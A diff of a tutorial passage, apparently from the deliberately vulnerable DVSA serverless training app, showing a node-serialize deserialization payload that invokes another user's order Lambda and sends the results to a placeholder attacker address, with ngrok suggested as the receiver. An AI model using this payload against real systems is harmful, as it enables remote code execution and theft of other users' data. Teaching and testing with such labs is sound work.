@@ -13,9 +13,10 @@ For example, to get the orders of another user, we can send the payload:
 ```
 {"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ORDER-ORDERS\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"user\": \"12312312-1233-1233-1233-123123123123\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"<ATTACKER_REMOTE_ADDRESS>\"+JSON.stringify(d));}); }()", "cart-id":""}
 ```
+
 Where the *12312312-1233-1233-1233-123123123123* is the user-id of the user we want to steal the data from, and *<ATTACKER_REMOTE_ADDRESS>* is any address that we can send the data to. E.g. [ngrok](https://ngrok.com/).
 
-As a result, we now have the user ordrs. 
+As a result, we now have the user ordrs:
 ![alt ngrok](https://i.imgur.com/CAcywDz.png)
 
 The above exmaple is the least of problems you can do with such an attack. Notice that there also admin functions :)
